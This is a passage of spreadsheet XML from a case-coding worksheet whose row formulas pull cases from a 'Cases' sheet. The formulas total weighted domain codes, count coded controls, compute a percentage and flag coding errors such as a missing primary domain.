      <c r="AO128" s="14" t="n"/>
    </row>
    <row r="129">
      <c r="A129" s="11">
        <f>Cases!A129</f>
        <v/>
      </c>
      <c r="B129" s="11">
        <f>Cases!B129</f>
        <v/>
      </c>
      <c r="C129" s="11">
        <f>Cases!C129</f>
        <v/>
      </c>
      <c r="D129" s="11">
        <f>IF(Cases!F129="",LEFT(Cases!G129,120),Cases!F129)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E129:L129)=0,"",SUM(E129:L129))</f>
        <v/>
      </c>
      <c r="AJ129" s="13">
        <f>IF(AI129="","",N(E129)*3+N(F129)*2+N(G129)*2+N(H129)*2+N(I129)*2+N(J129)*3+N(K129)*3+N(L129)*3)</f>
        <v/>
      </c>
      <c r="AK129" s="13">
        <f>IF(AI129="","",COUNTIF(N129:AG129,1))</f>
        <v/>
      </c>
      <c r="AL129" s="13">
        <f>IF(OR(AJ129="",AJ129=0),"",ROUND(100*(AJ129-AK129)/AJ129,1))</f>
        <v/>
      </c>
      <c r="AM129" s="11">
        <f>IF(AI129="","",IF(AI129=0,"No domain coded 1; ","")&amp;IF(M129="","Primary domain missing; ",IF(IFERROR(INDEX(E129:L129,1,M129),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N129:AG129)&lt;&gt;AJ129,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH129="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN129" s="13">
        <f>IF(AND(AI129&lt;&gt;"",AM129=""),1,0)</f>
        <v/>
      </c>
      <c r="AO129" s="14" t="n"/>
    </row>
    <row r="130">
      <c r="A130" s="11">
        <f>Cases!A130</f>
        <v/>
      </c>
      <c r="B130" s="11">
        <f>Cases!B130</f>
        <v/>
      </c>
      <c r="C130" s="11">
        <f>Cases!C130</f>
        <v/>
      </c>
      <c r="D130" s="11">
        <f>IF(Cases!F130="",LEFT(Cases!G130,120),Cases!F130)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E130:L130)=0,"",SUM(E130:L130))</f>
        <v/>
      </c>
      <c r="AJ130" s="13">
        <f>IF(AI130="","",N(E130)*3+N(F130)*2+N(G130)*2+N(H130)*2+N(I130)*2+N(J130)*3+N(K130)*3+N(L130)*3)</f>
        <v/>
      </c>
      <c r="AK130" s="13">
        <f>IF(AI130="","",COUNTIF(N130:AG130,1))</f>
        <v/>
      </c>
      <c r="AL130" s="13">
        <f>IF(OR(AJ130="",AJ130=0),"",ROUND(100*(AJ130-AK130)/AJ130,1))</f>
        <v/>
      </c>
      <c r="AM130" s="11">
        <f>IF(AI130="","",IF(AI130=0,"No domain coded 1; ","")&amp;IF(M130="","Primary domain missing; ",IF(IFERROR(INDEX(E130:L130,1,M130),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N130:AG130)&lt;&gt;AJ130,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH130="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN130" s="13">
        <f>IF(AND(AI130&lt;&gt;"",AM130=""),1,0)</f>
        <v/>
      </c>
      <c r="AO130" s="14" t="n"/>
    </row>
    <row r="131">
      <c r="A131" s="11">
        <f>Cases!A131</f>
        <v/>
      </c>
      <c r="B131" s="11">
        <f>Cases!B131</f>
        <v/>
      </c>
      <c r="C131" s="11">
        <f>Cases!C131</f>
        <v/>
      </c>
      <c r="D131" s="11">
        <f>IF(Cases!F131="",LEFT(Cases!G131,120),Cases!F131)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E131:L131)=0,"",SUM(E131:L131))</f>
        <v/>
      </c>
      <c r="AJ131" s="13">
        <f>IF(AI131="","",N(E131)*3+N(F131)*2+N(G131)*2+N(H131)*2+N(I131)*2+N(J131)*3+N(K131)*3+N(L131)*3)</f>
        <v/>
      </c>
      <c r="AK131" s="13">
        <f>IF(AI131="","",COUNTIF(N131:AG131,1))</f>
        <v/>
      </c>
      <c r="AL131" s="13">
        <f>IF(OR(AJ131="",AJ131=0),"",ROUND(100*(AJ131-AK131)/AJ131,1))</f>
        <v/>
      </c>
      <c r="AM131" s="11">
        <f>IF(AI131="","",IF(AI131=0,"No domain coded 1; ","")&amp;IF(M131="","Primary domain missing; ",IF(IFERROR(INDEX(E131:L131,1,M131),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N131:AG131)&lt;&gt;AJ131,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH131="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN131" s="13">
        <f>IF(AND(AI131&lt;&gt;"",AM131=""),1,0)</f>
        <v/>
      </c>
      <c r="AO131" s="14" t="n"/>
    </row>
    <row r="132">
      <c r="A132" s="11">
        <f>Cases!A132</f>
        <v/>
      </c>
      <c r="B132" s="11">
        <f>Cases!B132</f>
        <v/>
      </c>
      <c r="C132" s="11">
        <f>Cases!C132</f>
        <v/>
      </c>
      <c r="D132" s="11">
        <f>IF(Cases!F132="",LEFT(Cases!G132,120),Cases!F132)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E132:L132)=0,"",SUM(E132:L132))</f>
        <v/>
      </c>
      <c r="AJ132" s="13">
        <f>IF(AI132="","",N(E132)*3+N(F132)*2+N(G132)*2+N(H132)*2+N(I132)*2+N(J132)*3+N(K132)*3+N(L132)*3)</f>
        <v/>
      </c>
      <c r="AK132" s="13">
        <f>IF(AI132="","",COUNTIF(N132:AG132,1))</f>
        <v/>
      </c>
      <c r="AL132" s="13">
        <f>IF(OR(AJ132="",AJ132=0),"",ROUND(100*(AJ132-AK132)/AJ132,1))</f>
        <v/>
      </c>
      <c r="AM132" s="11">
        <f>IF(AI132="","",IF(AI132=0,"No domain coded 1; ","")&amp;IF(M132="","Primary domain missing; ",IF(IFERROR(INDEX(E132:L132,1,M132),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N132:AG132)&lt;&gt;AJ132,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH132="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN132" s="13">
        <f>IF(AND(AI132&lt;&gt;"",AM132=""),1,0)</f>
        <v/>
      </c>
      <c r="AO132" s="14" t="n"/>
    </row>
    <row r="133">
      <c r="A133" s="11">
        <f>Cases!A133</f>
        <v/>
      </c>
      <c r="B133" s="11">
        <f>Cases!B133</f>
        <v/>
      </c>
      <c r="C133" s="11">
        <f>Cases!C133</f>
        <v/>
      </c>
      <c r="D133" s="11">
        <f>IF(Cases!F133="",LEFT(Cases!G133,120),Cases!F133)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E133:L133)=0,"",SUM(E133:L133))</f>
        <v/>
      </c>
      <c r="AJ133" s="13">
        <f>IF(AI133="","",N(E133)*3+N(F133)*2+N(G133)*2+N(H133)*2+N(I133)*2+N(J133)*3+N(K133)*3+N(L133)*3)</f>
        <v/>
      </c>
      <c r="AK133" s="13">
        <f>IF(AI133="","",COUNTIF(N133:AG133,1))</f>
        <v/>
      </c>
      <c r="AL133" s="13">
        <f>IF(OR(AJ133="",AJ133=0),"",ROUND(100*(AJ133-AK133)/AJ133,1))</f>
        <v/>
      </c>
      <c r="AM133" s="11">
        <f>IF(AI133="","",IF(AI133=0,"No domain coded 1; ","")&amp;IF(M133="","Primary domain missing; ",IF(IFERROR(INDEX(E133:L133,1,M133),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N133:AG133)&lt;&gt;AJ133,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH133="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN133" s="13">
        <f>IF(AND(AI133&lt;&gt;"",AM133=""),1,0)</f>
        <v/>
      </c>
      <c r="AO133" s="14" t="n"/>
    </row>
    <row r="134">
      <c r="A134" s="11">
        <f>Cases!A134</f>
        <v/>
      </c>
      <c r="B134" s="11">
        <f>Cases!B134</f>
        <v/>
      </c>
      <c r="C134" s="11">
        <f>Cases!C134</f>
        <v/>
      </c>
      <c r="D134" s="11">
        <f>IF(Cases!F134="",LEFT(Cases!G134,120),Cases!F134)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E134:L134)=0,"",SUM(E134:L134))</f>
        <v/>
      </c>
      <c r="AJ134" s="13">
        <f>IF(AI134="","",N(E134)*3+N(F134)*2+N(G134)*2+N(H134)*2+N(I134)*2+N(J134)*3+N(K134)*3+N(L134)*3)</f>
        <v/>
      </c>
      <c r="AK134" s="13">
        <f>IF(AI134="","",COUNTIF(N134:AG134,1))</f>
        <v/>
      </c>
      <c r="AL134" s="13">
        <f>IF(OR(AJ134="",AJ134=0),"",ROUND(100*(AJ134-AK134)/AJ134,1))</f>
        <v/>
      </c>
      <c r="AM134" s="11">
        <f>IF(AI134="","",IF(AI134=0,"No domain coded 1; ","")&amp;IF(M134="","Primary domain missing; ",IF(IFERROR(INDEX(E134:L134,1,M134),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N134:AG134)&lt;&gt;AJ134,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH134="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN134" s="13">
        <f>IF(AND(AI134&lt;&gt;"",AM134=""),1,0)</f>
        <v/>
      </c>
      <c r="AO134" s="14" t="n"/>
    </row>
    <row r="135">
      <c r="A135" s="11">
        <f>Cases!A135</f>
        <v/>
      </c>
      <c r="B135" s="11">
        <f>Cases!B135</f>
        <v/>
      </c>
      <c r="C135" s="11">
        <f>Cases!C135</f>
        <v/>
      </c>
      <c r="D135" s="11">
        <f>IF(Cases!F135="",LEFT(Cases!G135,120),Cases!F135)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E135:L135)=0,"",SUM(E135:L135))</f>
        <v/>
      </c>
      <c r="AJ135" s="13">
        <f>IF(AI135="","",N(E135)*3+N(F135)*2+N(G135)*2+N(H135)*2+N(I135)*2+N(J135)*3+N(K135)*3+N(L135)*3)</f>
        <v/>
      </c>
      <c r="AK135" s="13">
        <f>IF(AI135="","",COUNTIF(N135:AG135,1))</f>
        <v/>
      </c>
      <c r="AL135" s="13">
        <f>IF(OR(AJ135="",AJ135=0),"",ROUND(100*(AJ135-AK135)/AJ135,1))</f>
        <v/>
      </c>
      <c r="AM135" s="11">
        <f>IF(AI135="","",IF(AI135=0,"No domain coded 1; ","")&amp;IF(M135="","Primary domain missing; ",IF(IFERROR(INDEX(E135:L135,1,M135),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N135:AG135)&lt;&gt;AJ135,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH135="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN135" s="13">
        <f>IF(AND(AI135&lt;&gt;"",AM135=""),1,0)</f>
        <v/>
      </c>
      <c r="AO135" s="14" t="n"/>
    </row>
    <row r="136">
      <c r="A136" s="11">
        <f>Cases!A136</f>
        <v/>
      </c>
      <c r="B136" s="11">
        <f>Cases!B136</f>
        <v/>
      </c>
      <c r="C136" s="11">
        <f>Cases!C136</f>
        <v/>
      </c>
      <c r="D136" s="11">
        <f>IF(Cases!F136="",LEFT(Cases!G136,120),Cases!F136)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E136:L136)=0,"",SUM(E136:L136))</f>
        <v/>
      </c>
      <c r="AJ136" s="13">
        <f>IF(AI136="","",N(E136)*3+N(F136)*2+N(G136)*2+N(H136)*2+N(I136)*2+N(J136)*3+N(K136)*3+N(L136)*3)</f>
        <v/>
      </c>
      <c r="AK136" s="13">
        <f>IF(AI136="","",COUNTIF(N136:AG136,1))</f>
        <v/>
      </c>
      <c r="AL136" s="13">
        <f>IF(OR(AJ136="",AJ136=0),"",ROUND(100*(AJ136-AK136)/AJ136,1))</f>
        <v/>
      </c>
      <c r="AM136" s="11">
        <f>IF(AI136="","",IF(AI136=0,"No domain coded 1; ","")&amp;IF(M136="","Primary domain missing; ",IF(IFERROR(INDEX(E136:L136,1,M136),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N136:AG136)&lt;&gt;AJ136,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH136="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN136" s="13">
        <f>IF(AND(AI136&lt;&gt;"",AM136=""),1,0)</f>
        <v/>
      </c>
      <c r="AO136" s="14" t="n"/>
    </row>
    <row r="137">
      <c r="A137" s="11">
        <f>Cases!A137</f>
        <v/>
      </c>
      <c r="B137" s="11">
        <f>Cases!B137</f>
        <v/>
      </c>
      <c r="C137" s="11">
        <f>Cases!C137</f>
        <v/>
      </c>
      <c r="D137" s="11">
        <f>IF(Cases!F137="",LEFT(Cases!G137,120),Cases!F137)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E137:L137)=0,"",SUM(E137:L137))</f>
        <v/>
      </c>
      <c r="AJ137" s="13">
        <f>IF(AI137="","",N(E137)*3+N(F137)*2+N(G137)*2+N(H137)*2+N(I137)*2+N(J137)*3+N(K137)*3+N(L137)*3)</f>
        <v/>
      </c>
      <c r="AK137" s="13">
        <f>IF(AI137="","",COUNTIF(N137:AG137,1))</f>
        <v/>
      </c>
      <c r="AL137" s="13">
        <f>IF(OR(AJ137="",AJ137=0),"",ROUND(100*(AJ137-AK137)/AJ137,1))</f>
        <v/>
      </c>
      <c r="AM137" s="11">
        <f>IF(AI137="","",IF(AI137=0,"No domain coded 1; ","")&amp;IF(M137="","Primary domain missing; ",IF(IFERROR(INDEX(E137:L137,1,M137),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N137:AG137)&lt;&gt;AJ137,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH137="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN137" s="13">
        <f>IF(AND(AI137&lt;&gt;"",AM137=""),1,0)</f>
        <v/>
      </c>
      <c r="AO137" s="14" t="n"/>
    </row>
    <row r="138">
      <c r="A138" s="11">
        <f>Cases!A138</f>
        <v/>
      </c>
      <c r="B138" s="11">
        <f>Cases!B138</f>
        <v/>
      </c>
      <c r="C138" s="11">
        <f>Cases!C138</f>
        <v/>
      </c>
      <c r="D138" s="11">
        <f>IF(Cases!F138="",LEFT(Cases!G138,120),Cases!F138)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E138:L138)=0,"",SUM(E138:L138))</f>
        <v/>
      </c>
      <c r="AJ138" s="13">
        <f>IF(AI138="","",N(E138)*3+N(F138)*2+N(G138)*2+N(H138)*2+N(I138)*2+N(J138)*3+N(K138)*3+N(L138)*3)</f>
        <v/>
      </c>
      <c r="AK138" s="13">
        <f>IF(AI138="","",COUNTIF(N138:AG138,1))</f>
        <v/>
      </c>
      <c r="AL138" s="13">
        <f>IF(OR(AJ138="",AJ138=0),"",ROUND(100*(AJ138-AK138)/AJ138,1))</f>
        <v/>
      </c>
      <c r="AM138" s="11">
        <f>IF(AI138="","",IF(AI138=0,"No domain coded 1; ","")&amp;IF(M138="","Primary domain missing; ",IF(IFERROR(INDEX(E138:L138,1,M138),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N138:AG138)&lt;&gt;AJ138,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH138="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN138" s="13">
        <f>IF(AND(AI138&lt;&gt;"",AM138=""),1,0)</f>
        <v/>
      </c>
      <c r="AO138" s="14" t="n"/>
    </row>
    <row r="139">
      <c r="A139" s="11">
        <f>Cases!A139</f>
        <v/>
      </c>
      <c r="B139" s="11">
        <f>Cases!B139</f>
        <v/>
      </c>
      <c r="C139" s="11">
        <f>Cases!C139</f>
        <v/>
      </c>
      <c r="D139" s="11">
        <f>IF(Cases!F139="",LEFT(Cases!G139,120),Cases!F139)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E139:L139)=0,"",SUM(E139:L139))</f>
        <v/>
      </c>
      <c r="AJ139" s="13">
        <f>IF(AI139="","",N(E139)*3+N(F139)*2+N(G139)*2+N(H139)*2+N(I139)*2+N(J139)*3+N(K139)*3+N(L139)*3)</f>
        <v/>
      </c>
      <c r="AK139" s="13">
        <f>IF(AI139="","",COUNTIF(N139:AG139,1))</f>
        <v/>
      </c>
      <c r="AL139" s="13">
        <f>IF(OR(AJ139="",AJ139=0),"",ROUND(100*(AJ139-AK139)/AJ139,1))</f>
        <v/>
      </c>
      <c r="AM139" s="11">
        <f>IF(AI139="","",IF(AI139=0,"No domain coded 1; ","")&amp;IF(M139="","Primary domain missing; ",IF(IFERROR(INDEX(E139:L139,1,M139),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N139:AG139)&lt;&gt;AJ139,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH139="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN139" s="13">
        <f>IF(AND(AI139&lt;&gt;"",AM139=""),1,0)</f>
        <v/>
      </c>
      <c r="AO139" s="14" t="n"/>
    </row>
    <row r="140">
      <c r="A140" s="11">
        <f>Cases!A140</f>
        <v/>
      </c>
      <c r="B140" s="11">
        <f>Cases!B140</f>
        <v/>
      </c>
      <c r="C140" s="11">
        <f>Cases!C140</f>
        <v/>
      </c>
      <c r="D140" s="11">
        <f>IF(Cases!F140="",LEFT(Cases!G140,120),Cases!F140)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E140:L140)=0,"",SUM(E140:L140))</f>
        <v/>
      </c>
      <c r="AJ140" s="13">
        <f>IF(AI140="","",N(E140)*3+N(F140)*2+N(G140)*2+N(H140)*2+N(I140)*2+N(J140)*3+N(K140)*3+N(L140)*3)</f>
        <v/>
      </c>
      <c r="AK140" s="13">
        <f>IF(AI140="","",COUNTIF(N140:AG140,1))</f>
        <v/>
      </c>
      <c r="AL140" s="13">
        <f>IF(OR(AJ140="",AJ140=0),"",ROUND(100*(AJ140-AK140)/AJ140,1))</f>
        <v/>
      </c>
      <c r="AM140" s="11">
        <f>IF(AI140="","",IF(AI140=0,"No domain coded 1; ","")&amp;IF(M140="","Primary domain missing; ",IF(IFERROR(INDEX(E140:L140,1,M140),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N140:AG140)&lt;&gt;AJ140,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH140="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN140" s="13">
        <f>IF(AND(AI140&lt;&gt;"",AM140=""),1,0)</f>
        <v/>
      </c>
      <c r="AO140" s="14" t="n"/>
    </row>
    <row r="141">
      <c r="A141" s="11">
        <f>Cases!A141</f>
        <v/>
      </c>
      <c r="B141" s="11">
        <f>Cases!B141</f>
        <v/>
      </c>
      <c r="C141" s="11">
        <f>Cases!C141</f>
        <v/>
      </c>
      <c r="D141" s="11">
        <f>IF(Cases!F141="",LEFT(Cases!G141,120),Cases!F141)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E141:L141)=0,"",SUM(E141:L141))</f>
        <v/>
      </c>
      <c r="AJ141" s="13">
        <f>IF(AI141="","",N(E141)*3+N(F141)*2+N(G141)*2+N(H141)*2+N(I141)*2+N(J141)*3+N(K141)*3+N(L141)*3)</f>
        <v/>
      </c>
      <c r="AK141" s="13">
        <f>IF(AI141="","",COUNTIF(N141:AG141,1))</f>
        <v/>
      </c>
      <c r="AL141" s="13">
        <f>IF(OR(AJ141="",AJ141=0),"",ROUND(100*(AJ141-AK141)/AJ141,1))</f>
        <v/>
      </c>
      <c r="AM141" s="11">
        <f>IF(AI141="","",IF(AI141=0,"No domain coded 1; ","")&amp;IF(M141="","Primary domain missing; ",IF(IFERROR(INDEX(E141:L141,1,M141),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N141:AG141)&lt;&gt;AJ141,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH141="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN141" s="13">
        <f>IF(AND(AI141&lt;&gt;"",AM141=""),1,0)</f>
        <v/>
      </c>
      <c r="AO141" s="14" t="n"/>
    </row>
    <row r="142">
      <c r="A142" s="11">
        <f>Cases!A142</f>
        <v/>
      </c>
      <c r="B142" s="11">
        <f>Cases!B142</f>
        <v/>
      </c>
      <c r="C142" s="11">
        <f>Cases!C142</f>
        <v/>
      </c>
      <c r="D142" s="11">
        <f>IF(Cases!F142="",LEFT(Cases!G142,120),Cases!F142)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E142:L142)=0,"",SUM(E142:L142))</f>
        <v/>
      </c>
      <c r="AJ142" s="13">
        <f>IF(AI142="","",N(E142)*3+N(F142)*2+N(G142)*2+N(H142)*2+N(I142)*2+N(J142)*3+N(K142)*3+N(L142)*3)</f>
        <v/>
      </c>
      <c r="AK142" s="13">
        <f>IF(AI142="","",COUNTIF(N142:AG142,1))</f>
        <v/>
      </c>
      <c r="AL142" s="13">
        <f>IF(OR(AJ142="",AJ142=0),"",ROUND(100*(AJ142-AK142)/AJ142,1))</f>
        <v/>
      </c>
      <c r="AM142" s="11">
        <f>IF(AI142="","",IF(AI142=0,"No domain coded 1; ","")&amp;IF(M142="","Primary domain missing; ",IF(IFERROR(INDEX(E142:L142,1,M142),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N142:AG142)&lt;&gt;AJ142,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH142="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN142" s="13">
        <f>IF(AND(AI142&lt;&gt;"",AM142=""),1,0)</f>
        <v/>
      </c>
      <c r="AO142" s="14" t="n"/>
    </row>
    <row r="143">
      <c r="A143" s="11">
        <f>Cases!A143</f>
        <v/>
      </c>
      <c r="B143" s="11">
        <f>Cases!B143</f>
        <v/>
      </c>
      <c r="C143" s="11">
        <f>Cases!C143</f>
        <v/>
      </c>
      <c r="D143" s="11">
        <f>IF(Cases!F143="",LEFT(Cases!G143,120),Cases!F143)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E143:L143)=0,"",SUM(E143:L143))</f>
        <v/>
      </c>
      <c r="AJ143" s="13">
        <f>IF(AI143="","",N(E143)*3+N(F143)*2+N(G143)*2+N(H143)*2+N(I143)*2+N(J143)*3+N(K143)*3+N(L143)*3)</f>
        <v/>
      </c>
      <c r="AK143" s="13">
        <f>IF(AI143="","",COUNTIF(N143:AG143,1))</f>
        <v/>
      </c>
      <c r="AL143" s="13">
        <f>IF(OR(AJ143="",AJ143=0),"",ROUND(100*(AJ143-AK143)/AJ143,1))</f>
        <v/>
      </c>
      <c r="AM143" s="11">
        <f>IF(AI143="","",IF(AI143=0,"No domain coded 1; ","")&amp;IF(M143="","Primary domain missing; ",IF(IFERROR(INDEX(E143:L143,1,M143),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N143:AG143)&lt;&gt;AJ143,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH143="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN143" s="13">
        <f>IF(AND(AI143&lt;&gt;"",AM143=""),1,0)</f>
        <v/>
      </c>
      <c r="AO143" s="14" t="n"/>
    </row>
    <row r="144">
      <c r="A144" s="11">
        <f>Cases!A144</f>
        <v/>
      </c>
      <c r="B144" s="11">
        <f>Cases!B144</f>
        <v/>
      </c>
      <c r="C144" s="11">
        <f>Cases!C144</f>
        <v/>
      </c>
      <c r="D144" s="11">
        <f>IF(Cases!F144="",LEFT(Cases!G144,120),Cases!F144)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E144:L144)=0,"",SUM(E144:L144))</f>
        <v/>
      </c>
      <c r="AJ144" s="13">
        <f>IF(AI144="","",N(E144)*3+N(F144)*2+N(G144)*2+N(H144)*2+N(I144)*2+N(J144)*3+N(K144)*3+N(L144)*3)</f>
        <v/>
      </c>
      <c r="AK144" s="13">
        <f>IF(AI144="","",COUNTIF(N144:AG144,1))</f>
        <v/>
      </c>
      <c r="AL144" s="13">
        <f>IF(OR(AJ144="",AJ144=0),"",ROUND(100*(AJ144-AK144)/AJ144,1))</f>
        <v/>
      </c>
      <c r="AM144" s="11">
        <f>IF(AI144="","",IF(AI144=0,"No domain coded 1; ","")&amp;IF(M144="","Primary domain missing; ",IF(IFERROR(INDEX(E144:L144,1,M144),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N144:AG144)&lt;&gt;AJ144,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH144="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN144" s="13">
        <f>IF(AND(AI144&lt;&gt;"",AM144=""),1,0)</f>
        <v/>
      </c>
      <c r="AO144" s="14" t="n"/>
    </row>
    <row r="145">
      <c r="A145" s="11">
        <f>Cases!A145</f>
        <v/>
      </c>
      <c r="B145" s="11">
        <f>Cases!B145</f>
        <v/>
      </c>
      <c r="C145" s="11">
        <f>Cases!C145</f>
        <v/>
      </c>
      <c r="D145" s="11">
        <f>IF(Cases!F145="",LEFT(Cases!G145,120),Cases!F145)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E145:L145)=0,"",SUM(E145:L145))</f>
        <v/>
      </c>
      <c r="AJ145" s="13">
        <f>IF(AI145="","",N(E145)*3+N(F145)*2+N(G145)*2+N(H145)*2+N(I145)*2+N(J145)*3+N(K145)*3+N(L145)*3)</f>
        <v/>
      </c>
      <c r="AK145" s="13">
        <f>IF(AI145="","",COUNTIF(N145:AG145,1))</f>
        <v/>
      </c>
      <c r="AL145" s="13">
        <f>IF(OR(AJ145="",AJ145=0),"",ROUND(100*(AJ145-AK145)/AJ145,1))</f>
        <v/>
      </c>
      <c r="AM145" s="11">
        <f>IF(AI145="","",IF(AI145=0,"No domain coded 1; ","")&amp;IF(M145="","Primary domain missing; ",IF(IFERROR(INDEX(E145:L145,1,M145),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N145:AG145)&lt;&gt;AJ145,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH145="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN145" s="13">
        <f>IF(AND(AI145&lt;&gt;"",AM145=""),1,0)</f>
        <v/>
      </c>
      <c r="AO145" s="14" t="n"/>
    </row>
    <row r="146">
      <c r="A146" s="11">
        <f>Cases!A146</f>
        <v/>
      </c>
      <c r="B146" s="11">
        <f>Cases!B146</f>
        <v/>
      </c>
      <c r="C146" s="11">
        <f>Cases!C146</f>
        <v/>
      </c>
      <c r="D146" s="11">
        <f>IF(Cases!F146="",LEFT(Cases!G146,120),Cases!F146)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E146:L146)=0,"",SUM(E146:L146))</f>
        <v/>
      </c>
      <c r="AJ146" s="13">
        <f>IF(AI146="","",N(E146)*3+N(F146)*2+N(G146)*2+N(H146)*2+N(I146)*2+N(J146)*3+N(K146)*3+N(L146)*3)</f>
        <v/>
      </c>
      <c r="AK146" s="13">
        <f>IF(AI146="","",COUNTIF(N146:AG146,1))</f>
        <v/>
      </c>
      <c r="AL146" s="13">
        <f>IF(OR(AJ146="",AJ146=0),"",ROUND(100*(AJ146-AK146)/AJ146,1))</f>
        <v/>
      </c>
      <c r="AM146" s="11">
        <f>IF(AI146="","",IF(AI146=0,"No domain coded 1; ","")&amp;IF(M146="","Primary domain missing; ",IF(IFERROR(INDEX(E146:L146,1,M146),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N146:AG146)&lt;&gt;AJ146,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH146="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN146" s="13">
        <f>IF(AND(AI146&lt;&gt;"",AM146=""),1,0)</f>
        <v/>
      </c>
      <c r="AO146" s="14" t="n"/>
    </row>
    <row r="147">
      <c r="A147" s="11">
        <f>Cases!A147</f>
        <v/>
      </c>
      <c r="B147" s="11">
        <f>Cases!B147</f>
        <v/>
      </c>
      <c r="C147" s="11">
        <f>Cases!C147</f>
        <v/>
      </c>
      <c r="D147" s="11">
        <f>IF(Cases!F147="",LEFT(Cases!G147,120),Cases!F147)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E147:L147)=0,"",SUM(E147:L147))</f>
        <v/>
      </c>
      <c r="AJ147" s="13">
        <f>IF(AI147="","",N(E147)*3+N(F147)*2+N(G147)*2+N(H147)*2+N(I147)*2+N(J147)*3+N(K147)*3+N(L147)*3)</f>
        <v/>
      </c>
      <c r="AK147" s="13">
        <f>IF(AI147="","",COUNTIF(N147:AG147,1))</f>
        <v/>
      </c>
      <c r="AL147" s="13">
        <f>IF(OR(AJ147="",AJ147=0),"",ROUND(100*(AJ147-AK147)/AJ147,1))</f>
        <v/>
      </c>
      <c r="AM147" s="11">
